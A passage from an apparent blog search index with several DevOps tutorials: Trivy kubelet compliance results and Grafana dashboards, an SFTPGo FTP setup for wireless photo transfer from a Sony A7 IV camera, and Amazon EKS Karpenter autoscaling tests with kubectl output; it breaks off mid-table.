Check Check ID: KCV0092 Description: Ensure that the Kubelet is configured to only use strong cryptographic ciphers. Messages: Ensure that the Kubelet only makes use of Strong Cryptographic Ciphers Severity: CRITICAL Success: false Title: Ensure that the Kubelet only makes use of Strong Cryptographic Ciphers Category: Kubernetes Security Check Check ID: KCV0081 Description: Enable Kubelet authentication using certificates. Messages: Ensure that the --client-ca-file argument is set as appropriate Severity: CRITICAL Success: false Title: Ensure that the --client-ca-file argument is set as appropriate Category: Kubernetes Security Check Check ID: KCV0080 Description: Do not allow all requests. Enable explicit authorization. Messages: Ensure that the --authorization-mode argument is not set to AlwaysAllow Severity: HIGH Success: false Title: Ensure that the --authorization-mode argument is not set to AlwaysAllow Category: Kubernetes Security Check Check ID: KCV0082 Description: Disable the read-only port. Messages: Verify that the --read-only-port argument is set to 0 Severity: HIGH Success: false Title: Verify that the --read-only-port argument is set to 0 Category: Kubernetes Security Check Check ID: KCV0090 Description: Enable kubelet client certificate rotation. Messages: Ensure that the --rotate-certificates argument is not set to false Severity: HIGH Success: false Title: Ensure that the --rotate-certificates argument is not set to false Category: Kubernetes Security Check Check ID: KCV0083 Description: Protect tuned kernel parameters from overriding kubelet default kernel parameter values. Messages: Ensure that the --protect-kernel-defaults is set to true Severity: HIGH Success: false Title: Ensure that the --protect-kernel-defaults is set to true Scanner: Name: Trivy Vendor: Aqua Security Version: 0.12.1 Summary: Critical Count: 5 High Count: 5 Low Count: 0 Medium Count: 0 Events: &lt;none&gt; Grafana Add Trivy Grafana Dashboards to kube-prometheus-stack: # renovate: datasource=helm depName=kube-prometheus-stack registryUrl=https://prometheus-community.github.io/helm-charts KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION=\"56.6.2\" cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack-trivy-operator-grafana.yml\" &lt;&lt; EOF grafana: dashboards: default: 17813-trivy-operator-dashboard: # renovate: depName=\"Trivy Operator Dashboard\" gnetId: 17813 revision: 2 datasource: Prometheus EOF helm upgrade --install --version \"${KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION}\" --namespace kube-prometheus-stack --reuse-values --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack-trivy-operator-grafana.yml\" kube-prometheus-stack prometheus-community/kube-prometheus-stack Add the following Grafana Dashboards to the existing kube-prometheus-stack Helm chart configuration: [16652] - Trivy Operator Dashboard Trivy Operator Dashboard [16742] - Trivy Image Vulnerability Overview Trivy Image Vulnerability Overview [16652] - Trivy Operator Reports Trivy Operator Reports Delete the previously created test namespaces: kubectl delete namespace test-trivy1 test-trivy2 test-trivy3 test-trivy4 || true Enjoy … 😉" }, { "title": "Transfer photos wirelessly from Sony cameras", "url": "/posts/ftp-and-sony-camera/", "categories": "Photography", "tags": "camera, sony", "date": "2023-01-15 00:00:00 +0100", "content": "FTP is a protocol I haven’t used for many years. Although I have configured FTP servers like vsftpd or ProFTPD in the past, this time I decided to explore SFTPGo. The main reason I wanted to run my own FTP server on my laptop was to transfer photos wirelessly from my Sony A7 IV camera, eliminating the need for cables or SD card swapping. SFTPGo Let’s look at how you can run the FTP server on macOS: Install SFTPGo: brew install sftpgo Create a test user and set up an admin account: sftpgo resetprovider --force --config-dir /usr/local/var/sftpgo cat &gt; /tmp/sftpgo-initprovider-data.json &lt;&lt; EOF { \"users\": [ { \"id\": 1, \"status\": 1, \"username\": \"test\", \"password\": \"test123\", \"home_dir\": \"${HOME}/Pictures/ftp\", \"uid\": 501, \"gid\": 20, \"permissions\": { \"/\": [ \"*\" ] } } ], \"folders\": [], \"admins\": [ { \"id\": 1, \"status\": 1, \"username\": \"admin\", \"password\": \"admin123\", \"permissions\": [ \"*\" ] } ] } EOF sftpgo initprovider --config-dir /usr/local/var/sftpgo --loaddata-from /tmp/sftpgo-initprovider-data.json Configure SFTPGo: cat &gt; /usr/local/etc/sftpgo/sftpgo.json &lt;&lt; EOF { \"ftpd\": { \"bindings\": [ { \"port\": 21 } ] }, \"httpd\": { \"bindings\": [ { \"port\": 7999 } ] }, \"sftpd\": { \"bindings\": [ { \"port\": 0 } ] } } EOF sudo brew services restart sftpgo Restart SFTPGo: sudo brew services restart sftpgo You can check the WebAdmin interface at http://127.0.0.1:8080/web/admin/users to see details about the created user. SFTPGo WebAdmin User SFTPGo WebAdmin Users Sony Camera FTP + WiFi settings Now, you need to configure your Sony camera (Sony A7 IV), connect it to your Wi-Fi network, and set up FTP transfer. Configure the Wi-Fi connection to your Access Point or wireless router. Alternatively, you can create a Personal Hotspot on your iPhone, as I did: flowchart LR A1[Network] --&gt; A2(Wi-Fi) --&gt; A3(Access Point Set.) --&gt; A4(...your WiFi AP...) Sony A7 IV WiFi AP Configuration Ensure your Mac is connected to the same Wi-Fi network as your Sony camera. Find your Mac’s local IP address by running the ifconfig command in the terminal: ❯ ifconfig en0 ... inet 172.20.10.4 netmask ... ... Configure the FTP settings on your camera: flowchart LR A1[Network] --&gt; A2(Transfer/Remote) --&gt; A3(FTP Transfer Func) --&gt; A4(Server Setting) --&gt; A5(Server 1) A5 --&gt; B1(Display Name) --&gt; B2(SFTPGo) A5 --&gt; C1(Destination Settings) --&gt; C2(Hostname) --&gt; C3(172.20.10.4) C1 --&gt; D1(Port) --&gt; D2(21) A5 --&gt; E1(User Info Setting) --&gt; E2(User) --&gt; E3(test) E1 --&gt; F1(Password) --&gt; F2(test123) Enable FTP transfer on your camera: flowchart LR A1[Network] --&gt; A2(Transfer/Remote) --&gt; A3(FTP Transfer Func) --&gt; A4(FTP Function) --&gt; A5(On) B1[Network] --&gt; B2(Transfer/Remote) --&gt; B3(FTP Transfer Func) --&gt; B4(FTP Power Save) --&gt; B5(On) Sony A7 IV FTP Configuration Initiate the FTP transfer to copy photos from your camera to your Mac: flowchart LR A1[Network] --&gt; A2(Transfer/Remote) --&gt; A3(FTP Transfer Func) --&gt; A4(FTP Transfer) --&gt; A5(OK) Sony A7 IV FTP Transfer The camera configuration process, including Wi-Fi setup, FTP settings, and photo transfer, can be viewed in the video Transfer photos wirelessly from Sony Cameras: Enjoy … 😉" }, { "title": "Amazon EKS - Karpenter tests", "url": "/posts/amazon-eks-karpenter-tests/", "categories": "Kubernetes, Cloud", "tags": "amazon-eks, kubernetes, karpenter, eksctl", "date": "2022-12-24 00:00:00 +0100", "content": "In the previous post, “Cheapest Amazon EKS”, I described installing Karpenter to improve the efficiency and cost-effectiveness of running workloads on the cluster. Many articles describe what Karpenter is, how it works, and the benefits of using it. Here are a few notes from my testing, demonstrating how it works with real-world examples. Requirements An Amazon EKS cluster with Karpenter configured as described in “Cheapest Amazon EKS” Helm The following variables are used in the subsequent steps: export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export TMP_DIR=\"${TMP_DIR:-${PWD}/tmp}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Install tools Install the following handy tools: eks-node-viewer viewnode kubectl-view-allocations kube-capacity ARCH=\"amd64\" curl -sL \"https://github.com/kubernetes-sigs/krew/releases/download/v0.4.5/krew-linux_${ARCH}.tar.gz\" | tar -xvzf - -C \"${TMP_DIR}\" --no-same-owner --strip-components=1 --wildcards \"*/krew-linux*\" \"${TMP_DIR}/krew-linux_${ARCH}\" install krew rm \"${TMP_DIR}/krew-linux_${ARCH}\" export PATH=\"${HOME}/.krew/bin:${PATH}\" kubectl krew install resource-capacity view-allocations viewnode Workloads Let’s run some example workloads to observe how Karpenter functions. Consolidation example Start amd64 nginx pods in the test-karpenter namespace: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-deployment-nginx.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: v1 kind: Namespace metadata: name: test-karpenter --- apiVersion: apps/v1 kind: Deployment metadata: name: nginx-deployment namespace: test-karpenter spec: selector: matchLabels: app: nginx replicas: 2 template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx resources: requests: cpu: 500m memory: 16Mi affinity: nodeAffinity: requiredDuringSchedulingIgnoredDuringExecution: nodeSelectorTerms: - matchExpressions: - key: managedBy operator: In values: - karpenter - key: provisioner operator: In values: - default nodeSelector: kubernetes.io/arch: amd64 EOF kubectl wait --for=condition=Available=True --timeout=5m --namespace=test-karpenter deployment nginx-deployment Karpenter will start a new t3a.small spot EC2 instance ip-192-168-66-142.ec2.internal: kubectl view-allocations --namespace test-karpenter --utilization --resource-name=memory --resource-name=cpu Resource Utilization Requested Limit Allocatable Free cpu (3%) 194.0m (17%) 1.0 __ 5.8 4.8 ├─ ip-192-168-14-250.ec2.internal __ __ __ 1.9 __ ├─ ip-192-168-16-172.ec2.internal __ __ __ 1.9 __ └─ ip-192-168-66-142.ec2.internal (0%) 2.0m (52%) 1.0 __ 1.9 930.0m ├─ nginx-deployment-589b44547-6k82l 1.0m 500.0m __ __ __ └─ nginx-deployment-589b44547-ssp97 1.0m 500.0m __ __ __ memory (20%) 1.5Gi (0%) 32.0Mi __ 7.9Gi 7.9Gi ├─ ip-192-168-14-250.ec2.internal __ __ __ 3.2Gi __ ├─ ip-192-168-16-172.ec2.internal __ __ __ 3.2Gi __ └─ ip-192-168-66-142.ec2.internal (0%) 5.3Mi (2%) 32.0Mi __ 1.5Gi 1.4Gi ├─ nginx-deployment-589b44547-6k82l 2.6Mi 16.0Mi __ __ __ └─ nginx-deployment-589b44547-ssp97 2.7Mi 16.0Mi __ __ __ Karpenter logs: kubectl logs -n karpenter --since=2m -l app.kubernetes.io/name=karpenter Outputs: ... 2023-01-29T18:35:16.902Z DEBUG controller.provisioner 390 out of 599 instance types were excluded because they would breach provisioner limits {\"commit\": \"5a7faa0-dirty\"} 2023-01-29T18:35:16.905Z INFO controller.provisioner found provisionable pod(s) {\"commit\": \"5a7faa0-dirty\", \"pods\": 2} 2023-01-29T18:35:16.905Z INFO controller.provisioner computed new node(s) to fit pod(s) {\"commit\": \"5a7faa0-dirty\", \"newNodes\": 1, \"pods\": 2} 2023-01-29T18:35:16.905Z INFO controller.provisioner launching node with 2 pods requesting {\"cpu\":\"1155m\",\"memory\":\"152Mi\",\"pods\":\"7\"} from types t3a.xlarge, t3a.2xlarge, t3a.small, t3a.medium, t3a.large {\"commit\": \"5a7faa0-dirty\", \"provisioner\": \"default\"} 2023-01-29T18:35:17.352Z DEBUG controller.provisioner.cloudprovider created launch template {\"commit\": \"5a7faa0-dirty\", \"provisioner\": \"default\", \"launch-template-name\": \"Karpenter-k01-2845501446139737819\", \"launch-template-id\": \"lt-0a4dbdf22b4e80f45\"} 2023-01-29T18:35:19.382Z INFO controller.provisioner.cloudprovider launched new instance {\"commit\": \"5a7faa0-dirty\", \"provisioner\": \"default\", \"id\": \"i-059d06b02509680a0\", \"hostname\": \"ip-192-168-66-142.ec2.internal\", \"instance-type\": \"t3a.small\", \"zone\": \"us-east-1a\", \"capacity-type\": \"spot\"} Increase the replica count to 5. This will prompt Karpenter to add a new spot worker node to run the 3 additional nginx pods: kubectl scale deployment nginx-deployment --namespace test-karpenter --replicas 5 kubectl wait --for=condition=Available=True --timeout=5m --namespace test-karpenter deployment nginx-deployment Check the details: kubectl view-allocations --namespace test-karpenter --utilization --resource-name=memory --resource-name=cpu Resource Utilization Requested Limit Allocatable Free cpu (3%) 208.0m (32%) 2.5 __ 7.7 5.2 ├─ ip-192-168-14-250.ec2.internal __ __ __ 1.9 __ ├─ ip-192-168-16-172.ec2.internal __ __ __ 1.9 __ ├─ ip-192-168-66-142.ec2.internal (0%) 3.0m (78%) 1.5 __ 1.9 430.0m │ ├─ nginx-deployment-589b44547-6k82l 1.0m 500.0m __ __ __ │ ├─ nginx-deployment-589b44547-ssp97 1.0m 500.0m __ __ __ │ └─ nginx-deployment-589b44547-x7bvl 1.0m 500.0m __ __ __ └─ ip-192-168-94-105.ec2.internal (0%) 2.0m (52%) 1.0 __ 1.9 930.0m ├─ nginx-deployment-589b44547-5jhkb 1.0m 500.0m __ __ __ └─ nginx-deployment-589b44547-vjzns 1.0m 500.0m __ __ __ memory (18%) 1.7Gi (1%) 80.0Mi __ 9.4Gi 9.3Gi ├─ ip-192-168-14-250.ec2.internal __ __ __ 3.2Gi __ ├─ ip-192-168-16-172.ec2.internal __ __ __ 3.2Gi __ ├─ ip-192-168-66-142.ec2.internal (1%) 8.0Mi (3%) 48.0Mi __ 1.5Gi 1.4Gi │ ├─ nginx-deployment-589b44547-6k82l 2.6Mi 16.0Mi __ __ __ │ ├─ nginx-deployment-589b44547-ssp97 2.7Mi 16.0Mi __ __ __ │ └─ nginx-deployment-589b44547-x7bvl 2.7Mi 16.0Mi __ __ __ └─ ip-192-168-94-105.ec2.internal (0%) 5.3Mi (2%) 32.0Mi __ 1.5Gi 1.4Gi ├─ nginx-deployment-589b44547-5jhkb 2.7Mi 16.0Mi __ __ __ └─ nginx-deployment-589b44547-vjzns 2.6Mi 16.0Mi __ __ __ Karpenter logs: kubectl logs -n karpenter --since=2m -l app.kubernetes.io/name=karpenter Outputs: ... 2023-01-29T18:38:07.389Z DEBUG controller.provisioner 391 out of 599 instance types were excluded because they would breach provisioner limits {\"commit\": \"5a7faa0-dirty\"} 2023-01-29T18:38:07.392Z INFO controller.provisioner found provisionable pod(s) {\"commit\": \"5a7faa0-dirty\", \"pods\": 2} 2023-01-29T18:38:07.392Z INFO controller.provisioner computed new node(s) to fit pod(s) {\"commit\": \"5a7faa0-dirty\", \"newNodes\": 1, \"pods\": 2} 2023-01-29T18:38:07.392Z INFO controller.provisioner launching node with 2 pods requesting {\"cpu\":\"1155m\",\"memory\":\"152Mi\",\"pods\":\"7\"} from types t3a.medium, t3a.large, t3a.xlarge, t3a.2xlarge, t3a.small {\"commit\": \"5a7faa0-dirty\", \"provisioner\": \"default\"} 2023-01-29T18:38:09.682Z INFO controller.provisioner.cloudprovider launched new instance {\"commit\": \"5a7faa0-dirty\", \"provisioner\": \"default\", \"id\": \"i-008c19ef038857a28\", \"hostname\": \"ip-192-168-94-105.ec2.internal\", \"instance-type\": \"t3a.small\", \"zone\": \"us-east-1a\", \"capacity-type\": \"spot\"} If the number of replicas is reduced to 3, Karpenter will determine that the workload running on two spot nodes can be consolidated onto a single node: kubectl scale deployment nginx-deployment --namespace test-karpenter --replicas 3 kubectl wait --for=condition=Available=True --timeout=5m --namespace test-karpenter deployment nginx-deployment sleep 20 Thanks to the consolidation feature (described in the “AWS re:Invent 2022 - Kubernetes virtually anywhere, for everyone” talk), the logs will look like this: kubectl logs -n karpenter --since=2m -l app.kubernetes.io/name=karpenter ... 2023-01-29T18:41:03.918Z INFO controller.deprovisioning deprovisioning via consolidation delete, terminating 1 nodes ip-192-168-66-142.ec2.internal/t3a.small/spot {\"commit\": \"5a7faa0-dirty\"} 2023-01-29T18:41:03.982Z INFO controller.termination cordoned node {\"commit\": \"5a7faa0-dirty\", \"node\": \"ip-192-168-66-142.ec2.internal\"} 2023-01-29T18:41:06.715Z INFO controller.termination deleted node {\"commit\": \"5a7faa0-dirty\", \"node\": \"ip-192-168-66-142.ec2.internal\"} Check the details: kubectl view-allocations --namespace test-karpenter --utilization --resource-name=memory --resource-name=cpu Resource Utilization Requested Limit Allocatable Free cpu (2%) 121.0m (26%) 1.5 __ 5.8 4.3 ├─ ip-192-168-14-250.ec2.internal __ __ __ 1.9 __ ├─ ip-192-168-16-172.ec2.internal __ __ __ 1.9 __ └─ ip-192-168-94-105.ec2.internal (0%) 3.0m (78%) 1.5 __ 1.9 430.0m ├─ nginx-deployment-589b44547-5jhkb 1.0m 500.0m __ __ __ ├─ nginx-deployment-589b44547-lnskq 1.0m 500.0m __ __ __ └─ nginx-deployment-589b44547-vjzns 1.0m 500.0m __ __ __ memory (20%) 1.6Gi (1%) 48.0Mi __ 7.9Gi 7.9Gi ├─ ip-192-168-14-250.ec2.internal __ __ __ 3.2Gi __ ├─ ip-192-168-16-172.ec2.internal __ __ __ 3.2Gi __ └─ ip-192-168-94-105.ec2.internal (1%) 8.0Mi (3%) 48.0Mi __ 1.5Gi 1.4Gi ├─ nginx-deployment-589b44547-5jhkb 2.7Mi 16.0Mi __ __ __ ├─ nginx-deployment-589b44547-lnskq 2.6Mi 16.0Mi __ __ __ └─ nginx-deployment-589b44547-vjzns 2.6Mi 16.0Mi __ __ __ Remove the nginx workload and the test-karpenter namespace: kubectl delete namespace test-karpenter || true Simple autoscaling It would be helpful to document a standard autoscaling example, including all relevant outputs and logs. Install the podinfo Helm chart and modify its default values: # renovate: datasource=helm depName=podinfo registryUrl=https://stefanprodan.github.io/podinfo PODINFO_HELM_CHART_VERSION=\"6.5.4\" helm repo add --force-update sp https://stefanprodan.github.io/podinfo cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-podinfo.yml\" &lt;&lt; EOF ingress: enabled: true className: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/stefanprodan/podinfo/gh-pages/cuddle_bunny.gif forecastle.stakater.com/appName: Podinfo hosts: - host: podinfo.${CLUSTER_FQDN} paths: - path: / pathType: ImplementationSpecific tls: - hosts: - podinfo.${CLUSTER_FQDN} resources: requests: cpu: 1 memory: 16Mi EOF helm upgrade --install --version \"${PODINFO_HELM_CHART_VERSION}\" --namespace podinfo --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-podinfo.yml\" podinfo sp/podinfo Check cluster and node details: kubectl get nodes -o wide NAME STATUS ROLES AGE VERSION INTERNAL-IP EXTERNAL-IP OS-IMAGE KERNEL-VERSION CONTAINER-RUNTIME ip-192-168-14-250.ec2.internal Ready &lt;none&gt; 46h v1.24.9-eks-4f83af2 192.168.14.250 54.158.242.60 Bottlerocket OS 1.12.0 (aws-k8s-1.24) 5.15.79 containerd://1.6.15+bottlerocket ip-192-168-16-172.ec2.internal Ready &lt;none&gt; 46h v1.24.9-eks-4f83af2 192.168.16.172 3.90.15.21 Bottlerocket OS 1.12.0 (aws-k8s-1.24) 5.15.79 containerd://1.6.15+bottlerocket ip-192-168-84-230.ec2.internal Ready &lt;none&gt; 79s v1.24.9-eks-4f83af2 192.168.84.230 &lt;none&gt; Bottlerocket OS 1.12.0 (aws-k8s-1.24) 5.15.79 containerd://1.6.15+bottlerocket Display details about node instance types and architectures: kubectl get nodes -o json | jq -Cjr '.items[] | .metadata.name,\" \",.metadata.labels.\"node.kubernetes.io/instance-type\",\" \",.metadata.labels.\"kubernetes.io/arch\", \"\\n\"' | sort -k2 -r | column -t ip-192-168-84-230.ec2.internal t4g.small arm64 ip-192-168-16-172.ec2.internal t4g.medium arm64 ip-192-168-14-250.ec2.internal t4g.medium arm64 View details about node capacity: kubectl resource-capacity --sort cpu.util --util --pod-count NODE CPU REQUESTS CPU LIMITS CPU UTIL MEMORY REQUESTS MEMORY LIMITS MEMORY UTIL POD COUNT * 3285m (56%) 3500m (60%) 417m (7%) 2410Mi (30%) 6840Mi (85%) 3112Mi (39%) 36/45 ip-192-168-14-250.ec2.internal 715m (37%) 1300m (67%) 299m (15%) 750Mi (22%) 2404Mi (72%) 1635Mi (49%) 17/17 ip-192-168-16-172.ec2.internal 1415m (73%) 1900m (98%) 82m (4%) 1524Mi (46%) 3668Mi (111%) 1024Mi (31%) 13/17 ip-192-168-84-230.ec2.internal 1155m (59%) 300m (15%) 37m (1%) 136Mi (9%) 768Mi (55%) 453Mi (32%) 6/11 A graphical view of CPU and memory utilization per node (including pricing information), produced by eks-node-viewer: eks-node-viewer --resources cpu,memory 3 nodes 3285m/5790m 56.7% cpu ███████████████████████░░░░░░░░░░░░░░░░░ 0.067/hour $49.056/month 2410Mi/8163424Ki 30.2% memory ████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 36 pods (0 pending 36 running 36 bound) ip-192-168-16-172.ec2.internal cpu ██████████████████████████░░░░░░░░░ 73% (13 pods) t4g.medium/$0.034 On-Demand - Ready memory ████████████████░░░░░░░░░░░░░░░░░░░ 46% ip-192-168-14-250.ec2.internal cpu █████████████░░░░░░░░░░░░░░░░░░░░░░ 37% (17 pods) t4g.medium/$0.034 On-Demand - Ready memory ████████░░░░░░░░░░░░░░░░░░░░░░░░░░░ 23% ip-192-168-84-230.ec2.internal cpu █████████████████████░░░░░░░░░░░░░░ 60% (6 pods) t4g.small Spot - Ready memory ███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ 10% Other details, produced by viewnode: kubectl viewnode --all-namespaces --show-metrics 36 pod(s) in total 0 unscheduled pod(s) 3 running node(s) with 36 scheduled pod(s): - ip-192-168-14-250.ec2.internal running 17 pod(s) (linux/arm64/containerd://1.6.15+bottlerocket | mem: 1.6 GiB) * external-dns: external-dns-7d5dfdc9bc-dwf2j (running | mem usage: 22.1 MiB) * forecastle: forecastle-fd9fbf494-mz78d (running | mem usage: 8.4 MiB) * ingress-nginx: ingress-nginx-controller-5c58df8c6f-5qtsj (running | mem usage: 77.9 MiB) * kube-prometheus-stack: alertmanager-kube-prometheus-stack-alertmanager-0 (running | mem usage: 20.8 MiB) * kube-prometheus-stack: kube-prometheus-stack-kube-state-metrics-75b97d7857-4q29f (running | mem usage: 15.3 MiB) * kube-prometheus-stack: kube-prometheus-stack-operator-c4576c8c5-lv9tj (running | mem usage: 33.6 MiB) * kube-prometheus-stack: kube-prometheus-stack-prometheus-node-exporter-grtqf (running | mem usage: 10.1 MiB) * kube-prometheus-stack: prometheus-kube-prometheus-stack-prometheus-0 (running | mem usage: 607.1 MiB) * kube-system: aws-node-m8bqr (running | mem usage: 30.9 MiB) * kube-system: aws-node-termination-handler-4d4vt (running | mem usage: 12.8 MiB) * kube-system: ebs-csi-controller-fd8649d65-dzr77 (running | mem usage: 54.8 MiB) * kube-system: ebs-csi-node-lnhz4 (running | mem usage: 20.9 MiB) * kube-system: kube-proxy-snhd4 (running | mem usage: 13.3 MiB) * kube-system: metrics-server-7bf7496f67-hg8dt (running | mem usage: 17.7 MiB) * mailhog: mailhog-7fd4cdc758-c6pht (running | mem usage: 4.0 MiB) * oauth2-proxy: oauth2-proxy-c74b9b769-7fx6m (running | mem usage: 8.4 MiB) * wiz: wiz-kubernetes-connector-broker-5d8fcfdb94-nq2lw (running | mem usage: 6.1 MiB) - ip-192-168-16-172.ec2.internal running 13 pod(s) (linux/arm64/containerd://1.6.15+bottlerocket | mem: 1.0 GiB) * cert-manager: cert-manager-7fb84796f4-mmp7g (running | mem usage: 30.7 MiB) * cert-manager: cert-manager-cainjector-7f694c4c58-s5f4s (running | mem usage: 33.8 MiB) * cert-manager: cert-manager-webhook-7cd8c769bb-5cr5d (running | mem usage: 11.5 MiB) * karpenter: karpenter-7b786469d4-s52fc (running | mem usage: 151.8 MiB) * kube-prometheus-stack: kube-prometheus-stack-grafana-b45c4f79-h67r8 (running | mem usage: 221.3 MiB) * kube-prometheus-stack: kube-prometheus-stack-prometheus-node-exporter-gtgv7 (running | mem usage: 9.3 MiB) * kube-system: aws-node-4d64v (running | mem usage: 28.0 MiB) * kube-system: aws-node-termination-handler-v9jpw (running | mem usage: 12.0 MiB) * kube-system: coredns-79989457d9-9bz5s (running | mem usage: 15.8 MiB) * kube-system: coredns-79989457d9-pv2gz (running | mem usage: 15.0 MiB) * kube-system: ebs-csi-controller-fd8649d65-pllkv (running | mem usage: 56.1 MiB) * kube-system: ebs-csi-node-cffz8 (running | mem usage: 19.3 MiB) * kube-system: kube-proxy-zvnhr (running | mem usage: 12.2 MiB) - ip-192-168-84-230.ec2.internal running 6 pod(s) (linux/arm64/containerd://1.6.15+bottlerocket | mem: 454.4 MiB) * kube-prometheus-stack: kube-prometheus-stack-prometheus-node-exporter-pd8qx (running | mem usage: 7.3 MiB) * kube-system: aws-node-4c49x (running | mem usage: 24.2 MiB) * kube-system: aws-node-termination-handler-dsd64 (running | mem usage: 11.6 MiB) * kube-system: ebs-csi-node-s7b85 (running | mem usage: 15.7 MiB) * kube-system: kube-proxy-2gblp (running | mem usage: 12.7 MiB) * podinfo: podinfo-59d6468db-jmwxh (running | mem usage: 13.4 MiB) Further details, produced by kubectl-view-allocations: kubectl view-allocations --utilization Resource Utilization Requested Limit Allocatable Free attachable-volumes-aws-ebs __ __ __ 117.0 __ ├─ ip-192-168-14-250.ec2.internal __ __ __ 39.0 __ ├─ ip-192-168-16-172.ec2.internal __ __ __ 39.0 __ └─ ip-192-168-84-230.ec2.internal __ __ __ 39.0 __ cpu (3%) 183.0m (57%) 3.3 (60%) 3.5 5.8 2.3 ├─ ip-192-168-14-250.ec2.internal (6%) 122.0m (37%) 715.0m (67%) 1.3 1.9 630.0m │ ├─ alertmanager-kube-prometheus-stack-alertmanager-0 2.0m 200.0m 200.0m __ __ │ ├─ aws-node-m8bqr 2.0m 25.0m __ __ __ │ ├─ aws-node-termination-handler-4d4vt 1.0m __ __ __ __ │ ├─ ebs-csi-controller-fd8649d65-dzr77 6.0m 60.0m 600.0m __ __ │ ├─ ebs-csi-node-lnhz4 3.0m 30.0m 300.0m __ __ │ ├─ external-dns-7d5dfdc9bc-dwf2j 1.0m __ __ __ __ │ ├─ forecastle-fd9fbf494-mz78d 1.0m __ __ __ __ │ ├─ ingress-nginx-controller-5c58df8c6f-5qtsj 1.0m 100.0m __ __ __ │ ├─ kube-prometheus-stack-kube-state-metrics-75b97d7857-4q29f 1.0m __ __ __ __ │ ├─ kube-prometheus-stack-operator-c4576c8c5-lv9tj 1.0m __ __ __ __ │ ├─ kube-prometheus-stack-prometheus-node-exporter-grtqf 1.0m __ __ __ __ │ ├─ kube-proxy-snhd4 1.0m 100.0m __ __ __ │ ├─ mailhog-7fd4cdc758-c6pht 1.0m __ __ __ __ │ ├─ metrics-server-7bf7496f67-hg8dt 3.0m __ __ __ __ │ ├─ oauth2-proxy-c74b9b769-7fx6m 1.0m __ __ __ __ │ ├─ prometheus-kube-prometheus-stack-prometheus-0 95.0m 200.0m 200.0m __ __ │ └─ wiz-kubernetes-connector-broker-5d8fcfdb94-nq2lw 1.0m __ __ __ __ ├─ ip-192-168-16-172.ec2.internal (3%) 50.0m (73%) 1.4 (98%) 1.9 1.9 30.0m │ ├─ aws-node-4d64v 2.0m 25.0m __ __ __ │ ├─ aws-node-termination-handler-v9jpw 1.0m __ __ __ __ │ ├─ cert-manager-7fb84796f4-mmp7g 1.0m __ __ __ __ │ ├─ cert-manager-cainjector-7f694c4c58-s5f4s 1.0m __ __ __ __ │ ├─ cert-manager-webhook-7cd8c769bb-5cr5d 1.0m __ __ __ __ │ ├─ coredns-79989457d9-9bz5s 1.0m 100.0m __ __ __ │ ├─ coredns-79989457d9-pv2gz 1.0m 100.0m __ __ __ │ ├─ ebs-csi-controller-fd8649d65-pllkv 6.0m 60.0m 600.0m __ __ │ ├─ ebs-csi-node-cffz8 3.0m 30.0m 300.0m __ __ │ ├─ karpenter-7b786469d4-s52fc 15.0m 1.0 1.0 __ __ │ ├─ kube-prometheus-stack-grafana-b45c4f79-h67r8 16.0m __ __ __ __ │ ├─ kube-prometheus-stack-prometheus-node-exporter-gtgv7 1.0m __ __ __ __ │ └─ kube-proxy-zvnhr 1.0m 100.0m __ __ __ └─ ip-192-168-84-230.ec2.internal (1%) 11.0m (60%) 1.2 (16%) 300.0m 1.9 775.0m ├─ aws-node-4c49x 3.0m 25.0m __ __ __ ├─ aws-node-termination-handler-dsd64 1.0m __ __ __ __ ├─ ebs-csi-node-s7b85 3.0m 30.0m 300.0m __ __ ├─ kube-prometheus-stack-prometheus-node-exporter-pd8qx 1.0m __ __ __ __ ├─ kube-proxy-2gblp 1.0m 100.0m __ __ __ └─ podinfo-59d6468db-jmwxh 2.0m 1.0 __ __ __ ephemeral-storage __ __ __ 53.8G __ ├─ ip-192-168-14-250.ec2.internal __ __ __ 17.9G __ ├─ ip-192-168-16-172.ec2.internal __ __ __ 17.9G __ └─ ip-192-168-84-230.ec2.internal __ __ __ 17.9G __ memory (21%) 1.6Gi (30%) 2.4Gi (86%) 6.7Gi 7.8Gi 1.1Gi ├─ ip-192-168-14-250.ec2.internal (29%) 967.2Mi (23%) 750.0Mi (73%) 2.3Gi 3.2Gi 894.4Mi │ ├─ alertmanager-kube-prometheus-stack-alertmanager-0 20.8Mi 250.0Mi 50.0Mi __ __ │ ├─ aws-node-m8bqr 30.9Mi __ __ __ __ │ ├─ aws-node-termination-handler-4d4vt 12.9Mi __ __ __ __ │ ├─ ebs-csi-controller-fd8649d65-dzr77 54.8Mi 240.0Mi 1.5Gi __ __ │ ├─ ebs-csi-node-lnhz4 20.9Mi 120.0Mi 768.0Mi __ __ │ ├─ external-dns-7d5dfdc9bc-dwf2j 22.1Mi __ __ __ __ │ ├─ forecastle-fd9fbf494-mz78d 8.4Mi __ __ __ __ │ ├─ ingress-nginx-controller-5c58df8c6f-5qtsj 77.9Mi 90.0Mi __ __ __ │ ├─ kube-prometheus-stack-kube-state-metrics-75b97d7857-4q29f 15.3Mi __ __ __ __ │ ├─ kube-prometheus-stack-operator-c4576c8c5-lv9tj 33.6Mi __ __ __ __ │ ├─ kube-prometheus-stack-prometheus-node-exporter-grtqf 10.0Mi __ __ __ __ │ ├─ kube-proxy-snhd4 13.3Mi __ __ __ __ │ ├─ mailhog-7fd4cdc758-c6pht 4.0Mi __ __ __ __ │ ├─ metrics-server-7bf7496f67-hg8dt 17.8Mi __ __ __ __ │ ├─ oauth2-proxy-c74b9b769-7fx6m 8.4Mi __ __ __ __ │ ├─ 